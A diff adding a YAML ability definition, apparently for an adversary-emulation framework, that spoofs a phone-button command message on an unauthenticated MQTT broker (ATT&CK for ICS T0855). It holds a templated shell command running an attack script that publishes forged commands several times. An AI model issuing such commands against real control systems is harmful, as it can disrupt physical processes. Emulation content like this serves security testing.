@@ -1,0 +1,19 @@
+---
+
+- id: b4291546-baaf-4b3b-a9b9-fb7235b7bfe5
+  name: MQTT - Spoof Phone Button (Command Message)
+  description: |
+    Publish to a phone button topic the controller treats as a momentary command input, over
+    the unauthenticated broker: an unauthorized command message, not just a falsified report.
+    Repeats a few times so a momentary point is seen. CWE-306 / CWE-345.
+  tactic: impair-process-control
+  technique_id: T0855
+  technique_name: Unauthorized Command Message
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      python3 mqtt_spoof.py --broker #{mqtt.broker.ip}:#{mqtt.broker.port}
+      --topic phone/#{mqtt.phone.id}/#{mqtt.phone.button} --message '{"v":1}' --count 3 --interval 1
+    payloads:
+    - mqtt_spoof.py
